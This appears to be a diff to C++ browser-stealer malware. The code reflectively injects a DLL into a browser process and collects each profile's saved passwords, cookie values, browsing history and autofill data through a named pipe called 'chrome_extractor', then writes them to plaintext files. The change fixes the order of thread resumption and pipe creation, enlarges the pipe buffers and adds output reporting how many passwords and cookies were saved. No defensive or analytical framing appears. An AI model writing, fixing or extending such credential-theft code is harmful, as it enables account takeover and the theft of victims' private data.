@@ -200,9 +200,9 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
     }
 
     inject_dll_reflective(pi.hProcess, dll_bytes);
-    ResumeThread(pi.hThread);
 
-    HANDLE h_pipe = CreateNamedPipeW(L"\\\\.\\pipe\\chrome_extractor", PIPE_ACCESS_INBOUND, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, 1, 65536, 65536, 0, NULL);
+    HANDLE h_pipe = CreateNamedPipeW(L"\\\\.\\pipe\\chrome_extractor", PIPE_ACCESS_INBOUND, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, 1, 1024 * 1024, 1024 * 1024, 0, NULL);
+    ResumeThread(pi.hThread);
 
     if (h_pipe != INVALID_HANDLE_VALUE) {
         std::cout << "Waiting for DLL connection..." << std::endl;
@@ -225,30 +225,42 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
                     fs::path browser_dir(browser.name);
                     fs::create_directories(browser_dir);
 
+                    std::cout << "Parsing JSON data..." << std::endl;
                     for (size_t i = 0; i < profiles.size(); ++i) {
-                        fs::path profile_dir = browser_dir / ("profile " + std::to_string(i + 1));
+                        std::string p_name = profiles[i]["name"].get<std::string>();
+                        fs::path profile_dir = browser_dir / ("profile " + std::to_string(i + 1) + " - " + p_name);
                         fs::create_directories(profile_dir);
 
-                        std::ofstream pass_file(profile_dir / "password.txt");
+                        std::string p_pass = (profile_dir / "password.txt").string();
+                        std::ofstream pass_file(p_pass);
                         for (auto& p : profiles[i]["passwords"]) {
                             pass_file << "URL: " << p["url"].get<std::string>() << "\nUser: " << p["username"].get<std::string>() << "\nPass: " << p["password"].get<std::string>() << "\n\n";
                         }
+                        pass_file.close();
 
-                        std::ofstream cookie_file(profile_dir / "cookie.txt");
+                        std::string p_cook = (profile_dir / "cookie.txt").string();
+                        std::ofstream cookie_file(p_cook);
                         for (auto& c : profiles[i]["cookies"]) {
                             cookie_file << "Host: " << c["host"].get<std::string>() << " | Name: " << c["name"].get<std::string>() << " | Value: " << c["value"].get<std::string>() << "\n";
                         }
+                        cookie_file.close();
 
-                        std::ofstream hist_file(profile_dir / "history.txt");
+                        std::string p_hist = (profile_dir / "history.txt").string();
+                        std::ofstream hist_file(p_hist);
                         for (auto& h : profiles[i]["history"]) {
                             hist_file << "URL: " << h["url"].get<std::string>() << " | Title: " << h["title"].get<std::string>() << " | Visits: " << h["visit_count"].get<int>() << "\n";
                         }
+                        hist_file.close();
 
-                        std::ofstream auto_file(profile_dir / "autofill.txt");
+                        std::string p_auto = (profile_dir / "autofill.txt").string();
+                        std::ofstream auto_file(p_auto);
                         for (auto& a : profiles[i]["autofill"]) {
                             auto_file << "Name: " << a["name"].get<std::string>() << " | Value: " << a["value"].get<std::string>() << "\n";
                         }
-                        std::wcout << L"Saved " << browser.name << L" profile: " << std::wstring(profiles[i]["name"].get<std::string>().begin(), profiles[i]["name"].get<std::string>().end()) << std::endl;
+                        auto_file.close();
+
+                        std::cout << "[+] Saved " << profiles[i]["passwords"].size() << " passwords to: " << p_pass << std::endl;
+                        std::cout << "[+] Saved " << profiles[i]["cookies"].size() << " cookies to: " << p_cook << std::endl;
                     }
                 } catch (...) {}
             }
